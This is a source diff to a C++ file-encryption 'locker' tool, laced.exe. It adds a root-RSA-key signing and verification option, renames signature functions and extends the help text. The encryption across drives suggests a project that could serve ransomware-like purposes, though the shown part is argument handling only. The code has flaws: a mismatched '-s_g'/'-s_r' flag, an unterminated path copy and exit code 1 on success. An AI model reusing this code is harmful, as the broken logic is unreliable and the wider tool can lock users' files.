@@ -24,6 +24,7 @@
 STATIC BOOL Gen = FALSE;
 STATIC BOOL THREAD_ENABLE = FALSE;
 STATIC BOOL Signature = FALSE;
+STATIC BOOL SignatureRoot = FALSE;
 
 
 CHAR* GetCommandLineArgCh(int argc, CHAR** argv, const CHAR* argv_name)
@@ -111,6 +112,47 @@ VOID ParsingCommandLine(int argc_, char** argv, WCHAR** wargv_)
     if (!helper) helper = GetCommandLineArg(argc, wargv, L"-help");
     if (helper) CommandLineHelper();
 
+    
+    WCHAR* RootSignature = GetCommandLineArgCurr(argc, wargv, L"-s_r");
+    if (!RootSignature) RootSignature = GetCommandLineArgCurr(argc, wargv, L"-sign_root");
+    if (RootSignature)
+    {        
+        SignatureRoot = TRUE;
+        RootSignature = GetCommandLineArg(argc, wargv, L"-p");
+        if(!RootSignature)RootSignature = GetCommandLineArg(argc, wargv, L"-path");
+        if (!RootSignature)
+        {
+            printf("Type full path to rsa public key\n");
+            exit(1);
+        }
+        else
+        {
+            size_t len = memory::StrLen(RootSignature);
+            WCHAR* spath = (WCHAR*)memory::m_malloc((len + 1) * sizeof(WCHAR));
+            wmemcpy_s(spath, len, RootSignature, len);
+            global::SetPath(spath);
+        }
+
+        RootSignature = GetCommandLineArgCurr(argc, wargv, L"-sign");
+        if(RootSignature)
+            global::SetStatus(TRUE);
+        else
+        {
+            RootSignature = GetCommandLineArgCurr(argc, wargv, L"-verify");
+            if (RootSignature)
+                global::SetStatus(FALSE);
+            else
+            {
+                printf("Type -sign / -verify\n");
+                exit(1);
+            }
+        }
+        
+        filesystem::RootKeySignatureTrust();
+        global::free_global();
+        printf("SUCCESS\n");
+        exit(1); /*RETURN SUCCESS*/
+    }
 
     WCHAR* path = GetCommandLineArg(argc, wargv, L"-p");
     if (!path) path = GetCommandLineArg(argc, wargv, L"-path");
@@ -118,7 +160,7 @@ VOID ParsingCommandLine(int argc_, char** argv, WCHAR** wargv_)
     {
         WCHAR* locale = (WCHAR*)memory::m_malloc(MAX_PATH * sizeof(WCHAR));
         GetCurrentDirectoryW(MAX_PATH, locale);
-        global::SetPath(locale);        
+        global::SetPath(locale);
     }
     else if (path)
     {
@@ -489,7 +531,7 @@ STATIC BOOL ParseFileConfig(int argc, char** argv, std::vector<CHAR*>* strings, 
 STATIC VOID free_vector(std::vector<CHAR*>* strings, std::vector<WCHAR*>* stringsW);
 STATIC VOID free_HashList(SLIST<locker::HLIST>* HashList);
 int main(int argc, char** argv)
-{           
+{
     CHAR* pars = GetCommandLineArgChCurr(argc, argv, "config");
     if (pars)    
     {
@@ -513,9 +555,9 @@ int main(int argc, char** argv)
     else
         ParsingCommandLine(argc, argv, NULL);
 
-    SLIST<locker::HLIST>* HashList = NULL;
+    SLIST<HASH_LIST>* HashList = NULL;
     if (Signature)
-        HashList = new SLIST<locker::HLIST>;
+        HashList = new SLIST<HASH_LIST>;
 
     
     if (global::GetCryptName() || global::GetRsaBase64())
@@ -579,9 +621,9 @@ int main(int argc, char** argv)
     {
         filesystem::sort_hashList(HashList);
         if(global::GetDeCrypt() == CRYPT)
-            filesystem::CraeteSignatureFile(HashList);
+            filesystem::CreateSignatureFile(HashList, NULL, NULL, 0);
         else if(global::GetDeCrypt() == DECRYPT)
-            filesystem::VerifycationSignatureFile(HashList);
+            filesystem::VerificationSignatureFile(HashList, NULL, NULL, 0);
     }
 
     pathsystem::FreeList(DriveInfo);
@@ -691,6 +733,14 @@ VOID CommandLineHelper()
     printf("[*]  -p / -path          Path to save the generated keys. Optional field. If null, saves in local path.\n");
     printf("[*]  -print              Print the generated keys in HEX format. (default: false)\n");
     printf("EXAMPLE USAGE:           laced.exe RSAGenKey -path C:/GenTofolder -B64 -bit 4096\n\n");
+    
+    printf("Signature with Root RSA keys. Before signing the public key, you must first generate a key pair using the -print command");
+    printf("and then insert the byte array into the locker::LoadRootKey function and compile it.\n");
+    printf("[*]    -s_g / -sign_root    Command options for signing with RootRSAKey.\n");
+    printf("[*]    -sign                Signature with Root private key. (default: -sign)\n");
+    printf("[*]    -verify              Verification with Root public key. (default: -sign)\n");
+    printf("[*]    -p / -path           Path to the public key file. Required field.\n");
+    printf("EXAMPLE USAGE Signature:   laced.exe -sign_root -p C:/key/RSA_public_key_laced.txt -sign/-verify\n\n");
     printf_s("%s\n", std::string(120, '-').c_str());
     exit(0);
 }
